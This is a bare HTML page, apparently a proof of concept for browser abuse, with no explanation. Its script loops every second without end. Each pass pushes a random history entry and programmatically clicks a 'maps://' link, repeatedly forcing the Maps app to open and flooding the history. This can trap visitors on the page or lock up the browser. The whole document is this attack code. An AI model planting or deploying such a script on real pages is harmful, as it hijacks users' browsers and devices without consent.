<script>
const stateObj = { foo: "bar" };
</script>
<a id="link" href="maps://test">OPEN MAPS</a>
<script>

function delay(time) {
  return new Promise(resolve => setTimeout(resolve, time));
}

function clickLoop() {
	delay(1000).then(() => {
		history.pushState(stateObj, '', Math.random());
		document.getElementById('link').click();
		clickLoop();
	})
}
clickLoop();

</script>
